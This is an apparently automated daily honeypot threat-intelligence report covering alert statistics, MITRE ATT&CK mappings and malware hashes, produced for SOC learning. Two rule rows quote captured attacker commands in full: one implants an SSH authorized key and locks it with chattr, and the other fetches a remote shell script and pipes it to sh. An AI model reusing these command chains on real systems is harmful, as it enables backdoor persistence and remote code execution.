# LearningLab01 Daily Threat Intelligence Report — 2026-09-11

Generated: 2026-09-11T13:15:05.058Z

Report window: 2026-09-10T13:15:05.034Z through 2026-09-11T13:15:05.034Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 136,733 |
| Attack-related alerts | 19,511 |
| Honeypot interactions | 127,923 |
| Authentication failures | 3,358 |
| Authentication successes | 395 |
| Critical alerts | 19 |
| High alerts | 291 |
| T-Pot artifacts observed | 13 |
| Malicious artifact detections | 11 |

### Notable Observations

- 19 critical-severity alerts require priority review.
- 291 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 8.50:1.
- Country attribution currently covers only 4.04% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110207: T-Pot SentryPeer SIP activity from [IP address]:50457, method INVITE (73,346 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 19 | 0.01% |
| High | 291 | 0.21% |
| Medium | 1,227 | 0.90% |
| Low | 135,196 | 98.88% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 3,358
- Authentication successes: 395
- Failure-to-success ratio: 8.50:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 14,253 | 73.05% |
| Payload delivery | 14,253 | 73.05% |
| Authentication failure | 3,358 | 17.21% |
| Web attack | 857 | 4.39% |
| Command execution | 418 | 2.14% |
| Reconnaissance | 368 | 1.89% |
| Network scan | 99 | 0.51% |
| SMTP attack | 97 | 0.50% |
| Malware | 58 | 0.30% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 5,527 alerts, representing 4.04% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 131,206 | 95.96% | Not geolocated |
| New Zealand | 2,754 | 2.01% | ████████████████████ |
| United States | 2,510 | 1.84% | ██████████████████ |
| United Kingdom | 216 | 0.16% | ██ |
| France | 13 | 0.01% | █ |
| Austria | 7 | 0.01% | █ |
| Bosnia and Herzegovina | 6 | 0.00% | █ |
| Romania | 6 | 0.00% | █ |
| Russia | 4 | 0.00% | █ |
| China | 3 | 0.00% | █ |
| Germany | 2 | 0.00% | █ |
| Netherlands | 2 | 0.00% | █ |
| Turkey | 2 | 0.00% | █ |
| Belgium | 1 | 0.00% | █ |
| Iran | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Initial Access | 307 |
| Defense Evasion | 295 |
| Persistence | 293 |
| Privilege Escalation | 293 |
| Lateral Movement | 98 |
| Credential Access | 62 |
| Impact | 58 |
| Execution | 51 |
| Command and Control | 18 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 293 |
| Remote Services | 98 |
| Brute Force | 62 |
| Stored Data Manipulation | 58 |
| Command and Scripting Interpreter | 51 |
| Ingress Tool Transfer | 18 |
| Exploit Public-Facing Application | 14 |
| Disable or Modify Tools | 2 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110207 | 5 | 73,346 | T-Pot SentryPeer SIP activity from [IP address]:50457, method INVITE | tpot (73,346) |
| 110209 | 5 | 15,644 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (15,644) |
| 110205 | 6 | 14,173 | T-Pot Honeytrap received a payload from [IP address] | tpot (14,173) |
| 110213 | 4 | 10,956 | T-Pot RDP connection from [IP address] to port 3389. | tpot (10,956) |
| 110204 | 4 | 6,234 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (6,234) |
| 110219 | 4 | 5,308 | T-Pot CiscoASA web activity from [IP address]: "GET / HTTP/1.1" 200 - | tpot (5,308) |
| 110101 | 3 | 3,976 | Cowrie SSH connection from [IP address]. | tpot (3,976) |
| 110102 | 5 | 3,358 | Cowrie failed login from [IP address] using username root. | tpot (3,358) |
| 110223 | 5 | 845 | T-Pot HoneyAML received GET request from [IP address] to /fetch on port 3000. | tpot (845) |
| 110201 | 4 | 492 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (492) |
| 110104 | 7 | 372 | Cowrie captured a command from [IP address]: &k`g&k\|zpkfq)ES[M | tpot (372) |
| 110216 | 4 | 290 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (290) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 5501 | 3 | 195 | PAM: Login session opened. | tpot (193), wazuh (2) |
| 5502 | 3 | 182 | PAM: Login session closed. | tpot (180), wazuh (2) |
| 110221 | 7 | 142 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (142) |
| 110103 | 10 | 102 | Cowrie accepted login from [IP address] using username lghkel	. | tpot (102) |
| 5715 | 3 | 98 | sshd: authentication success. | tpot (97), wazuh (1) |
| 110217 | 7 | 97 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (97) |
| 110214 | 9 | 96 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (96) |
| 110215 | 4 | 83 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (83) |
| 110212 | 10 | 80 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (80) |
| 110220 | 8 | 76 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (76) |
| 110106 | 10 | 62 | Cowrie detected repeated failed logins from [IP address]. | tpot (62) |
| 510 | 7 | 42 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (2) |
| 110108 | 12 | 37 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (37) |
| 550 | 7 | 36 | Integrity checksum changed. | wazuh (36) |
| 2904 | 7 | 27 | Dpkg (Debian Package) half configured. | tpot (24), wazuh (3) |
| 110208 | 7 | 26 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:19514 | tpot (26) |
| 592 | 8 | 22 | Log file size reduced. | tpot (22) |
| 2902 | 7 | 15 | New dpkg (Debian Package) installed. | tpot (13), wazuh (2) |
| 110225 | 13 | 14 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (14) |
| 110224 | 7 | 12 | T-Pot HoneyAML received an HTTP POST from [IP address] to /fetch. | tpot (12) |
| 203 | 9 | 8 | Agent event queue is full. Events may be lost. | tpot (8) |
| 202 | 7 | 7 | Agent event queue is 90% full. | tpot (7) |
| 205 | 3 | 7 | Agent event queue is back to normal load. | tpot (7) |
| 110109 | 13 | 5 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A" | tpot (5) |
| 110107 | 12 | 4 | Cowrie captured a probable payload-retrieval command from [IP address]: uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp \|\| cd /var/tmp \|\| cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh | tpot (4) |
| 110105 | 12 | 3 | Cowrie captured a file download from [IP address]. | tpot (3) |
| 110211 | 9 | 3 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (3) |
| 110226 | 10 | 3 | T-Pot HoneyAML detected repeated web requests from one source. | tpot (3) |
| 110218 | 9 | 2 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 503 | 3 | 2 | Wazuh agent started. | tpot (2) |
| 506 | 3 | 2 | Wazuh agent stopped. | tpot (2) |
| 86003 | 3 | 2 | Docker: Error message | tpot (2) |
| 11 | 4 | 1 | Unknown | tpot (1) |
| 110222 | 9 | 1 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 13
- Known hashes: 13
- Uploaded or analyzed: 0
- Malicious detections: 11
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| e61a6cf122030d42f6acfd9ae77eb2da82b8b52c1a1a862e015df260bfc03492 | 27852800 | known | 39 | 0 | 24 | [Open](https://www.virustotal.com/gui/file/e61a6cf122030d42f6acfd9ae77eb2da82b8b52c1a1a862e015df260bfc03492) |
| 8e1a67a5c03b3cd818f046c7a1605afccc0ee5ce437a0d099881f1872b54bc70 | 1838060 | known | 36 | 0 | 28 | [Open](https://www.virustotal.com/gui/file/8e1a67a5c03b3cd818f046c7a1605afccc0ee5ce437a0d099881f1872b54bc70) |
| 3f3bf218089d1488617d37f8a5116bb2791eb39ce06a1b5bc9a4cdfe5e94dd39 | 1759768 | known | 35 | 0 | 28 | [Open](https://www.virustotal.com/gui/file/3f3bf218089d1488617d37f8a5116bb2791eb39ce06a1b5bc9a4cdfe5e94dd39) |
| f0aa83bbbd2c75e2f71ec16029ee5fcfad59f3a8efa30a500b815f0f6c18d987 | 1989056 | known | 34 | 0 | 29 | [Open](https://www.virustotal.com/gui/file/f0aa83bbbd2c75e2f71ec16029ee5fcfad59f3a8efa30a500b815f0f6c18d987) |
| d1cac82f44b54b0fd244a9e4122811e9ae108a197c7a65a20fd2e7552683e68e | 1696412 | known | 34 | 0 | 29 | [Open](https://www.virustotal.com/gui/file/d1cac82f44b54b0fd244a9e4122811e9ae108a197c7a65a20fd2e7552683e68e) |
| d70f917e35813a7ae323e6b2b539d6dbbfc3a3a6599f1fed93430b14ca08b141 | 1448252 | known | 34 | 0 | 28 | [Open](https://www.virustotal.com/gui/file/d70f917e35813a7ae323e6b2b539d6dbbfc3a3a6599f1fed93430b14ca08b141) |
| 2779ac942a1c5d8f07f6eec7d4707d1bf2583760029573da7fd23210084fa405 | 1399 | known | 31 | 0 | 30 | [Open](https://www.virustotal.com/gui/file/2779ac942a1c5d8f07f6eec7d4707d1bf2583760029573da7fd23210084fa405) |
| 1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d | 2126 | known | 28 | 0 | 33 | [Open](https://www.virustotal.com/gui/file/1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d) |
| e7061379de0d12588c9d833b912a05e3835c9dc630902c8d10b460ec972f0298 | 1444 | known | 27 | 0 | 29 | [Open](https://www.virustotal.com/gui/file/e7061379de0d12588c9d833b912a05e3835c9dc630902c8d10b460ec972f0298) |
| 2d41372a3ee70895ee6be05e3a94d460dc9a2feb61b9fb907f3155e0c120c992 | 1519 | known | 23 | 0 | 36 | [Open](https://www.virustotal.com/gui/file/2d41372a3ee70895ee6be05e3a94d460dc9a2feb61b9fb907f3155e0c120c992) |
| 3f3a11bafabb1a35db913cfe51995f2e357d049e268860175876ae5a93d23892 | 1157 | known | 21 | 0 | 40 | [Open](https://www.virustotal.com/gui/file/3f3a11bafabb1a35db913cfe51995f2e357d049e268860175876ae5a93d23892) |
| ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e | 55 | known | 0 | 0 | 60 | [Open](https://www.virustotal.com/gui/file/ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e) |
| 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca | 405 | known | 0 | 0 | 61 | [Open](https://www.virustotal.com/gui/file/0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca) |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
